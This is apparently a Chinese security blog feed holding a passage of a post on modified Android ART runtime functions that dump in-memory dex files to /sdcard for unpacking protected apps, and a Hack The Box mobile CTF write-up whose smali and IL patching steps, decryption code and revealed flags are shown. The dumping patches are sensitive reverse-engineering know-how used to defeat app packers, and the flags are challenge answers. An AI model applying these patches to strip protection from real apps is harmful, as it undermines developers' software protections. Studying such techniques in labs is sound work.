read(fcmdline, szProcName,256);        close(fcmdline);    &#125;                 if(szProcName[0])    &#123;            memset(dexfilepath,0,1000);                           sprintf(dexfilepath,&quot;&#x2F;sdcard&#x2F;%s_%d_dexfile.dex&quot;,szProcName,size_int_);                 int dexfilefp&#x3D;open(dexfilepath,O_RDONLY,0666);            if(dexfilefp&gt;0)&#123;                                close(dexfilefp);                                dexfilefp&#x3D;0;                                                                   &#125;else&#123;                                        int fp&#x3D;open(dexfilepath,O_CREAT|O_RDWR,666);                                        if(fp&gt;0)                                        &#123;                                            write(fp,(void*)begin_,size_);                                            fsync(fp);                                             close(fp);                                              &#125;                                                               &#125;    &#125;     if(dexfilepath!&#x3D;nullptr)    &#123;        free(dexfilepath);        dexfilepath&#x3D;nullptr;    &#125;                           &#125;&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="其他脱壳点"><a href="#其他脱壳点" class="headerlink" title="其他脱壳点"></a>其他脱壳点</h2><p>看了寒冰大佬的文章，按照寻找脱壳点的办法找到几个新的脱壳点，这里也来记录一下，利用的是dexcache来到出dexfile。曾经有过类似的调用，也有不少利用dexcache来查找和导出的办法，比如在Java层hook函数getDex。</p><p><strong>DexCache_getDexNative</strong></p><pre class="line-numbers language-none"><code class="language-none">namespace art &#123;static jobject DexCache_getDexNative(JNIEnv* env, jobject javaDexCache) &#123;  ScopedFastNativeObjectAccess soa(env);  mirror::DexCache* dex_cache &#x3D; soa.Decode&lt;mirror::DexCache*&gt;(javaDexCache);  &#x2F;&#x2F; Should only be called while holding the lock on the dex cache.  DCHECK_EQ(dex_cache-&gt;GetLockOwnerThreadId(), soa.Self()-&gt;GetThreadId());  const DexFile* dex_file &#x3D; dex_cache-&gt;GetDexFile();  &#x2F;&#x2F; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;新增int fcmdline &#x3D; -1;char szCmdline[64] &#x3D; &#123; 0 &#125;;char szProcName[256] &#x3D; &#123; 0 &#125;;int procid &#x3D; getpid();sprintf(szCmdline, &quot;&#x2F;proc&#x2F;%d&#x2F;cmdline&quot;, procid);fcmdline &#x3D; open(szCmdline, O_RDONLY, 0644);if (fcmdline &gt; 0) &#123;    read(fcmdline, szProcName, 256);    close(fcmdline);&#125;char *dexfilepath &#x3D; (char *) malloc(sizeof(char) * 2000);const uint8_t *begin_ &#x3D; dex_file-&gt;Begin();   &#x2F;&#x2F;dex的起始和大小size_t size_ &#x3D; dex_file-&gt;Size();memset(dexfilepath, 0, 2000);int size_int_ &#x3D; (int) size_;memset(dexfilepath, 0, 2000);sprintf(dexfilepath, &quot;%s&quot;, &quot;&#x2F;sdcard&#x2F;fiart&quot;);mkdir(dexfilepath, 0777);memset(dexfilepath, 0, 2000);sprintf(dexfilepath, &quot;&#x2F;sdcard&#x2F;fiart&#x2F;%s&quot;,szProcName);  &#x2F;&#x2F;创建保存的文件mkdir(dexfilepath, 0777);memset(dexfilepath, 0, 2000);sprintf(dexfilepath,&quot;&#x2F;sdcard&#x2F;fiart&#x2F;%s&#x2F;%d_dexfile.dex&quot;,szProcName, size_int_);int dexfilefp &#x3D; open(dexfilepath, O_RDONLY, 0666);if (dexfilefp &gt; 0) &#123;    close(dexfilefp);    dexfilefp &#x3D; 0;&#125; else &#123;    dexfilefp &#x3D; open(dexfilepath, O_CREAT | O_RDWR,0666);    if (dexfilefp &gt; 0) &#123;        write(dexfilefp, (void *) begin_,size_);        fsync(dexfilefp);        close(dexfilefp);&#125;&#125;&#x2F;&#x2F; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  if (dex_file &#x3D;&#x3D; nullptr) &#123;    return nullptr;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>GetNameAsString</strong><br>按照如下新增代码，需要新增库。</p><pre class="line-numbers language-none"><code class="language-none">mirror::String* ArtMethod::GetNameAsString(Thread* self) &#123;  CHECK(!IsProxyMethod());  StackHandleScope&lt;1&gt; hs(self);  Handle&lt;mirror::DexCache&gt; dex_cache(hs.NewHandle(GetDexCache()));  auto* dex_file &#x3D; dex_cache-&gt;GetDexFile();  &#x2F;&#x2F; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;    char *dexfilepath&#x3D;(char*)malloc(sizeof(char)*1000);       const uint8_t* begin_&#x3D;dex_file-&gt;Begin();  &#x2F;&#x2F; Start of data.    size_t size_&#x3D;dex_file-&gt;Size();  &#x2F;&#x2F; Length of data.    int size_int_&#x3D;(int)size_;    int fcmdline &#x3D;-1;    char szCmdline[64]&#x3D; &#123;0&#125;;    char szProcName[256] &#x3D; &#123;0&#125;;    int procid &#x3D; getpid();    sprintf(szCmdline,&quot;&#x2F;proc&#x2F;%d&#x2F;cmdline&quot;, procid);    fcmdline &#x3D; open(szCmdline, O_RDONLY,0644);    if(fcmdline &gt;0)    &#123;        read(fcmdline, szProcName,256);        close(fcmdline);    &#125;                 if(szProcName[0])    &#123;            memset(dexfilepath,0,1000);                           sprintf(dexfilepath,&quot;&#x2F;sdcard&#x2F;%s_%d_dexfile.dex&quot;,szProcName,size_int_);                 int dexfilefp&#x3D;open(dexfilepath,O_RDONLY,0666);            if(dexfilefp&gt;0)&#123;                 close(dexfilefp);                 dexfilefp&#x3D;0;                 &#125;else&#123;                 int fp&#x3D;open(dexfilepath,O_CREAT|O_APPEND|O_RDWR,0666);                 if(fp&gt;0)                      &#123;                       write(fp,(void*)begin_,size_);                       fsync(fp);                        close(fp);                         &#125;               &#125;    &#125;     if(dexfilepath!&#x3D;nullptr)    &#123;        free(dexfilepath);        dexfilepath&#x3D;nullptr;    &#125;   &#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  uint32_t dex_method_idx &#x3D; GetDexMethodIndex();  const DexFile::MethodId&amp; method_id &#x3D; dex_file-&gt;GetMethodId(dex_method_idx);  return Runtime::Current()-&gt;GetClassLinker()-&gt;ResolveString(*dex_file, method_id.name_idx_,dex_cache);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>EqualParameters</strong></p><p>也是类似如上，利用dex缓存来导出的dexfile。</p><pre class="line-numbers language-none"><code class="language-none">bool ArtMethod::EqualParameters(Handle&lt;mirror::ObjectArray&lt;mirror::Class&gt;&gt; params) &#123;  auto* dex_cache &#x3D; GetDexCache();  auto* dex_file &#x3D; dex_cache-&gt;GetDexFile();  &#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  char *dexfilepath&#x3D;(char*)malloc(sizeof(char)*1000);       const uint8_t* begin_&#x3D;dex_file-&gt;Begin();  &#x2F;&#x2F; Start of data.    size_t size_&#x3D;dex_file-&gt;Size();  &#x2F;&#x2F; Length of data.    int size_int_&#x3D;(int)size_;    int fcmdline &#x3D;-1;    char szCmdline[64]&#x3D; &#123;0&#125;;    char szProcName[256] &#x3D; &#123;0&#125;;    int procid &#x3D; getpid();    sprintf(szCmdline,&quot;&#x2F;proc&#x2F;%d&#x2F;cmdline&quot;, procid);    fcmdline &#x3D; open(szCmdline, O_RDONLY,0644);    if(fcmdline &gt;0)    &#123;        read(fcmdline, szProcName,256);        close(fcmdline);    &#125;    if(szProcName[0])    &#123;        memset(dexfilepath,0,1000);                       sprintf(dexfilepath,&quot;&#x2F;sdcard&#x2F;%s_%d_dexfile.dex&quot;,szProcName,size_int_);             int dexfilefp&#x3D;open(dexfilepath,O_RDONLY,0666);        if(dexfilefp&gt;0)&#123;             close(dexfilefp);             dexfilefp&#x3D;0;                                                &#125;else&#123;             int fp&#x3D;open(dexfilepath,O_CREAT|O_APPEND|O_RDWR,0666);             if(fp&gt;0)&#123;                  write(fp,(void*)begin_,size_);                  fsync(fp);                   close(fp);                &#125;            &#125;    &#125; if(dexfilepath!&#x3D;nullptr)    &#123;        free(dexfilepath);        dexfilepath&#x3D;nullptr;    &#125;                            &#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  const auto&amp; method_id &#x3D; dex_file-&gt;GetMethodId(GetDexMethodIndex());  const auto&amp; proto_id &#x3D; dex_file-&gt;GetMethodPrototype(method_id);  const DexFile::TypeList* proto_params &#x3D; dex_file-&gt;GetProtoParameters(proto_id);  auto count &#x3D; proto_params !&#x3D; nullptr ? proto_params-&gt;Size() : 0u;  auto param_len &#x3D; params.Get() !&#x3D; nullptr ? params-&gt;GetLength() : 0u;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在将 dex 文件编译为 oat 文件的过程中 , 只要出现了 DexFile 对象 , 就可以将该对象对应的 dex 文件导出&lt;/p&gt;
&lt;h2 id=&quot;已知的脱壳点&quot;&gt;&lt;a href=&quot;#已知的脱壳点&quot; class=&quot;headerlink&quot; title=&quot;已知的脱壳点&quot;&gt;
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>HTB Challenges Mobile</title>
    <link href="https://misakikata.github.io/2022/09/HTB-Challenges-Mobile/"/>
    <id>https://misakikata.github.io/2022/09/HTB-Challenges-Mobile/</id>
    <published>2022-09-05T10:00:02.000Z</published>
    <updated>2022-09-05T10:04:43.460Z</updated>
    
    <content type="html"><![CDATA[<h2 id="APKey"><a href="#APKey" class="headerlink" title="APKey"></a>APKey</h2><p><a href="https://app.hackthebox.com/5a438e22-07d2-4f61-9ab5-040db08fae2e">https://app.hackthebox.com/5a438e22-07d2-4f61-9ab5-040db08fae2e</a></p><p>安装APP界面是一个输入用户名和密码，用GDA打开apk，发现这个是固定用户名为admin来验证passwd的一个过程，验证成功则返回flag。</p><pre class="line-numbers language-none"><code class="language-none">public void onClick(View p0)&#123;       Toast toast;       try&#123;          if (this.b.c.getText().toString().equals(&quot;admin&quot;)) &#123;             MainActivity b &#x3D; this.b;             String str &#x3D; b.d.getText().toString();             try&#123;                MessageDigest instance &#x3D; MessageDigest.getInstance(&quot;MD5&quot;);                instance.update(str.getBytes());                byte[] uobyteArray &#x3D; instance.digest();                StringBuffer str1 &#x3D; new StringBuffer();                for (int i &#x3D; 0; i &lt; uobyteArray.length; i &#x3D; i + 1) &#123;                   str1.append(Integer.toHexString((uobyteArray[i] &amp; 0x00ff)));                &#125;                str &#x3D; str1.toString();             &#125;catch(java.security.NoSuchAlgorithmException e5)&#123;                str.printStackTrace();                str &#x3D; &quot;&quot;;             &#125;             if (str.equals(&quot;a2a3d412e92d896134d9c9126d756f&quot;)) &#123;                MainActivity b1 &#x3D; this.b;                toast &#x3D; Toast.makeText(this.b.getApplicationContext(), b.a(g.a()), 1);             label_0077 :                toast.show();             &#125;          &#125;          toast &#x3D; Toast.makeText(this.b.getApplicationContext(), &quot;Wrong Credentials!&quot;, 0);          goto label_0077 ;       &#125;catch(java.lang.Exception e5)&#123;          p0.printStackTrace();       &#125;       return;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到把密码进行md5加密后还会对字节再进行一次&amp;运算。因此这里不去对hash进行碰撞解密。有几种解密的办法。</p><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>修改smail代码，把判断的if函数进行修改，原代码为</p><pre class="line-numbers language-none"><code class="language-none">const-string p1, &quot;&quot;​    :goto_1    const-string v1, &quot;a2a3d412e92d896134d9c9126d756f&quot;​    .line 2    invoke-virtual &#123;p1, v1&#125;, Ljava&#x2F;lang&#x2F;String;-&gt;equals(Ljava&#x2F;lang&#x2F;Object;)Z​    move-result p1​    if-eqz p1, :cond_1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>p1为0的话进程跳转，但是这个cond_1是报错，所以我们需要它不跳转。修改为if-nez。然后用AKill进行编译和安装，记得删除原包，然后输入admin&#x2F;aaaaa，点击会显示flag。</p><p>同样也可以修改新增一个赋值。</p><pre class="line-numbers language-none"><code class="language-none">:cond_0    invoke-virtual &#123;v1&#125;, Ljava&#x2F;lang&#x2F;StringBuffer;-&gt;toString()Ljava&#x2F;lang&#x2F;String;​    move-result-object p1        const-string p1, &quot;a2a3d412e92d896134d9c9126d756f&quot;  &#x2F;&#x2F;新增        :try_end_1    .catch Ljava&#x2F;security&#x2F;NoSuchAlgorithmException; &#123;:try_start_1 .. :try_end_1&#125; :catch_0    .catch Ljava&#x2F;lang&#x2F;Exception; &#123;:try_start_1 .. :try_end_1&#125; :catch_1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这时候不需要属于密码，点击login即可显示flag。</p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>上面的办法近乎于偷懒解决，现在我们开始解决一下这个代码的计算过程。先找到<code>g.a()</code>这个方法。</p><pre class="line-numbers language-none"><code class="language-none">public static String a()&#123;       ArrayList uArrayList &#x3D; new ArrayList();       uArrayList.add(&quot;722gFc&quot;);       uArrayList.add(&quot;n778Hk&quot;);       uArrayList.add(&quot;jvC5bH&quot;);       uArrayList.add(&quot;lSu6G6&quot;);       uArrayList.add(&quot;HG36Hj&quot;);       uArrayList.add(&quot;97y43E&quot;);       uArrayList.add(&quot;kjHf5d&quot;);       uArrayList.add(&quot;85tR5d&quot;);       uArrayList.add(&quot;1UlBm2&quot;);       uArrayList.add(&quot;kI94fD&quot;);       uArrayList &#x3D; new ArrayList();       uArrayList.add(&quot;ue7888&quot;);       uArrayList.add(&quot;6HxWkw&quot;);       uArrayList.add(&quot;gGhy77&quot;);       uArrayList.add(&quot;837gtG&quot;);       uArrayList.add(&quot;HyTg67&quot;);       uArrayList.add(&quot;GHR673&quot;);       uArrayList.add(&quot;ftr56r&quot;);       uArrayList.add(&quot;kikoi9&quot;);       uArrayList.add(&quot;kdoO0o&quot;);       uArrayList.add(&quot;2DabnR&quot;);       uArrayList &#x3D; new ArrayList();       uArrayList.add(&quot;jH67k8&quot;);       uArrayList.add(&quot;8Huk89&quot;);       uArrayList.add(&quot;fr5GtE&quot;);       uArrayList.add(&quot;Hg5f6Y&quot;);       uArrayList.add(&quot;o0J8G5&quot;);       uArrayList.add(&quot;Wod2bk&quot;);       uArrayList.add(&quot;Yuu7Y5&quot;);       uArrayList.add(&quot;kI9ko0&quot;);       uArrayList.add(&quot;dS4Er5&quot;);       uArrayList.add(&quot;h93Fr5&quot;);       return new StringBuilder()+uArrayList.get(8)+h.a()+i.a()+f.a()+e.a()+uArrayList.get(9)+c.a()+uArrayList.get(5)+d.a()+a.a();    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从结果上看，就是<code>uArrayList.get(8)=1UlBm2</code>，<code>h.a()=kHtZuV</code>，然后依次类推，得到返回的是<code>1UlBm2kHtZuVrSE6qY6HxWkwHyeaX92DabnRFlEGyLWod2bkwAxcoc85S94kFpV1</code>。</p><p>最后再去查看<code>b.a()</code></p><pre class="line-numbers language-none"><code class="language-none">public static String a(String p0)&#123;       Cipher instance &#x3D; Cipher.getInstance(g.b());       instance.init(2, new SecretKeySpec(new StringBuilder()+String.valueOf(h.a().charAt(0))+String.valueOf(a.a().charAt(8))+String.valueOf(e.a().charAt(5))+String.valueOf(i.a().charAt(4))+String.valueOf(h.a().charAt(1)).toLowerCase()+String.valueOf(h.a().charAt(4))+String.valueOf(h.a().charAt(3)).toLowerCase()+String.valueOf(h.a().charAt(3))+String.valueOf(h.a().charAt(0))+String.valueOf(a.a().charAt(8)).toLowerCase()+String.valueOf(a.a().charAt(8)).toLowerCase()+String.valueOf(i.a().charAt(0))+String.valueOf(c.a().charAt(3)).toLowerCase()+String.valueOf(f.a().charAt(3))+String.valueOf(f.a().charAt(0))+String.valueOf(c.a().charAt(0)).getBytes(), g.b()));       return new String(instance.doFinal(Base64.decode(p0, 0)), &quot;utf-8&quot;);    &#125;  &#x2F;&#x2F;这里有个问题最后的getbytes写的是最后一个字节的，实际上是全部的，这是gda的伪代码bug。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是一段加密的东东，这个<code>g.b()</code>指的是加密算法。</p><pre class="line-numbers language-none"><code class="language-none">public static String b()&#123;       return new StringBuilder()+String.valueOf(d.a().charAt(1))+String.valueOf(i.a().charAt(2))+String.valueOf(i.a().charAt(1));   &#x2F;&#x2F;AES    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>先把上面的那一段字符找出来，结果是<code>kV9qhuzZkvvrgW6F</code>，至此密钥也有了，拿去解密一下。</p><p>于是在ECB模式下，pkcs7，128位解密出来的为：<code>HTB&#123;m0r3_0bfusc4t1on_w0uld_n0t_hurt&#125;</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202209051759336.png" alt="image-20220831154334828"></p><h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>这个办法已经有点过分了，打开JEB，没错它会自动给你计算出来</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202209051759338.png" alt="image-20220831154358852"></p><p>呜呜呜，一开始不知道，还在那一个字节一个字节的算半天，结果这边直接给你搞出来了。</p><h2 id="SeeTheSharpFlag"><a href="#SeeTheSharpFlag" class="headerlink" title="SeeTheSharpFlag"></a>SeeTheSharpFlag</h2><p>这个APP完美的诠释了复杂，一个简单的功能搞得贼复杂，这个是x86架构，一般app都是arm或者至少支持arm和x86，这个玩意只有这个架构，只能在模拟器中运行。</p><p>反编译后可以看到里面的包，Main在crc644cebad5a72cca3b1.MainActivity下。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202209051759339.png" alt="image-20220901101054390"></p><p>从代码上看大量调用了native方法，也就是引用了so文件，没错一开始我就是这么想的，但是搜了半天没搜到调用的so代码。</p><p>觉得这个包mono和Xamarin有点问题，看起来就像是调用的框架一样，搜一下Xamarin发现还真是开源平台。</p><p><a href="https://docs.microsoft.com/zh-cn/xamarin/get-started/what-is-xamarin">https://docs.microsoft.com/zh-cn/xamarin/get-started/what-is-xamarin</a></p><pre class="line-numbers language-none"><code class="language-none">Xamarin 是一个开放源代码平台，用于通过 .NET 构建适用于 iOS、Android 和 Windows 的新式高性能应用程序。 Xamarin 是一个抽象层，可管理共享代码与基础平台代码的通信。 Xamarin 在提供便利（如内存分配和垃圾回收）的托管环境中运行。​Xamarin 使开发人员可以跨平台共享其应用程序（平均 90%）。 此模式允许开发人员以一种语言编写所有业务逻辑（或重复使用现有应用程序代码），但在每个平台上实现本机性能和外观。​Xamarin 应用程序可以在电脑或 Mac 上进行编写并编译为本机应用程序包，如 Android 上的 .apk 文件，或 iOS 上的 .ipa 文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以这个东西是用C#当作中间语言进行编写的，适用本机的应用程序，而且mono是执行环境。所以这大概就是为啥给的一个x86的。</p><p>里面的so看起来都是框架的so，也没有自己编写的加解密so。进入手机端查看是不是还生成了啥。</p><p>Xamarin的文件目录在<code>/data/user/0/com.companyname.seethesharpflag/</code>下，可惜啥都没有，难道真要去分析这些代码不成。</p><p>终于在想起来解压一下看看资源文件的时候发现assemblies目录，里面有一对dll文件，同时还存在一个SeeTheSharpFlag的这种dll，好家伙在这等着你呢。</p><h3 id="方法一：-1"><a href="#方法一：-1" class="headerlink" title="方法一："></a>方法一：</h3><p>使用010editor打开查看一下，发现文件头是58414C5A，不是标准的PE头4D5A。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202209051759340.png" alt="image-20220901111330401"></p><p>然后搜索<code>XALZ dll</code>，发现了这么一个项目：<a href="https://github.com/NickstaDB/xamarin-decompress">https://github.com/NickstaDB/xamarin-decompress</a></p><p>所以这个dll是被xamarin项目进行压缩过，只需要解压缩就可以正常反编译了。</p><p>关于这个Xamarin项目和dll的介绍：<a href="https://cihansol.com/blog/index.php/2021/08/09/unpacking-xamarin-android-mobile-applications/">https://cihansol.com/blog/index.php/2021/08/09/unpacking-xamarin-android-mobile-applications/</a></p><p>在这里多说一句，项目的打包方式分为两种：非捆绑构建和捆绑构建，最直观的区别在其中的dll文件是否直接显示在文件内，捆绑构建会把dll打包为一个so文件，需要进一步解包才能拿到dll文件。如果遇到捆绑式打包则可以使用上文中的工具进行解包：<a href="https://github.com/cihansol/XamAsmUnZ">https://github.com/cihansol/XamAsmUnZ</a></p><p>使用dnspy打开解压缩后的dll，在SeeTheSharpFlag.decompressed.dll中可以找到关键处。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202209051759341.png" alt="image-20220901121802638"></p><p>点击右键编辑IL指令，修改33行的brfalse.s为brtrue.s。保存替换原dll。但这种只是破解，在这种需要输出的情况下不能达到目的，只是让显示成功而已。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202209051759342.png" alt="image-20220901140820471"></p><p>所以我们需要输出的是streamReader.ReadToEnd()。将指令中其他无关的指令nop掉</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202209051759343.png" alt="image-20220901162025169"></p><p>结果为如下，这样我们只需要输入任意值，均可显示这个flag参数。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202209051759344.png" alt="image-20220901162035742"></p><p>看起来很不错，但是问题在覆写了dll后，APK打包签名后不能执行，因为这里有几点需要注意一下：</p><ol><li>因为已经解压缩了，所以全部的dll都要解压缩一起打包。</li><li>不能压缩，只能用压缩工具进行打包，如果压缩了会造成文件错误。</li><li>还需要进行APK的字节对齐，使用zipalign优化即可。这一步使用的集成工具进行。</li><li>修改zip包为apk，然后进行签名安装即可，如果是上述修改则不需要输入，直接点击即可。</li></ol><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202209051759345.png" alt="image-20220901162316280"></p><h3 id="方法二：-1"><a href="#方法二：-1" class="headerlink" title="方法二："></a>方法二：</h3><p>换一种思路，尝试把这个方法自己运行一遍，找个在线运行C#的网站：<a href="https://www.bejson.com/runcode/csharp/">https://www.bejson.com/runcode/csharp/</a>。运行以下代码：</p><pre class="line-numbers language-none"><code class="language-none">using System;using System.CodeDom.Compiler;using System.IO;using System.Reflection;using System.Security.Cryptography;​class Program&#123;    public static void Main(string[] args)    &#123;        byte[] array &#x3D; Convert.FromBase64String(&quot;sjAbajc4sWMUn6CHJBSfQ39p2fNg2trMVQ&#x2F;MmTB5mno&#x3D;&quot;);        byte[] array2 &#x3D; Convert.FromBase64String(&quot;6F+WgzEp5QXodJV+iTli4Q&#x3D;&#x3D;&quot;);        byte[] array3 &#x3D; Convert.FromBase64String(&quot;DZ6YdaWJlZav26VmEEQ31A&#x3D;&#x3D;&quot;);        using (AesManaged aesManaged &#x3D; new AesManaged())            &#123;                using (ICryptoTransform cryptoTransform &#x3D; aesManaged.CreateDecryptor(array2, array3))                &#123;                    using (MemoryStream memoryStream &#x3D; new MemoryStream(array))                    &#123;                        using (CryptoStream cryptoStream &#x3D; new CryptoStream(memoryStream, cryptoTransform, 0))                        &#123;                            using (StreamReader streamReader &#x3D; new StreamReader(cryptoStream))                            &#123;                                Console.WriteLine(streamReader.ReadToEnd());                            &#125;                        &#125;                    &#125;                &#125;            &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以得到结果：</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n70" mdtype="fences">HTB{MyPasswordIsVerySecure}</pre><h2 id="SAW"><a href="#SAW" class="headerlink" title="SAW"></a>SAW</h2><p>下载后，这个APP大概两M不到，安装需要SDK29以上，手头没有这么高的安卓版本，尝试降级也不行，后来查了一下论坛发现有人提示需要发送一个“send”特定的东西，重新看了一下代码，发现onCreate里有验证，不存在会直接被finish进程。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202209051759346.png" alt="image-20220905153036735"></p><p>解决办法也很简单，我直接把这一段的smail代码干掉了。结果就是这样，下面是重新编译重新打开的。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202209051759347.png" alt="image-20220905153129666"></p><p>顺便把alert方法内的也做掉了，虽然看起来不太影响</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202209051759348.png" alt="image-20220905153254942"></p><p>虽然能打开，但是显示click me，但是点击还是会结束，看了半天发现是显示窗口上应该是有覆盖，修改<code>new LayoutParams(200, 200, 2, 8, -2)</code>中的-2为-4，这样点击虽然能显示这个白色窗口，但还没显示后续的alert方法内的窗口。也就是这个窗口没有显示在最上层，依然被覆盖。这个没解决，但从代码上看只需要查看so应该就可以了。</p><p>调用的a方法参数，第一个是FILE_PATH_PREFIX，应该是APP的数据存储位置，第二个是answer，不知道是啥，但是应该是需要输入的东西。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202209051759349.png" alt="image-20220905154405154"></p><p>查看so内的a方法，里面有一个关键方法是_Z1aP7_JNIEnvP8_1，从传参得知，参数a2并不是很关键，他的作用更是一种判断，这里不去管做啥的。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202209051759350.png" alt="image-20220905154249620"></p><p>现在需要找到jni_def，这个数组和0x64进行了异或，然后写入文件，这里的路径就是有权限写的应该就是数据存储目录<code>/data/user/0/com.stego.saw/</code>，jni_def是如下的一堆十六进制数据。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202209051759351.png" 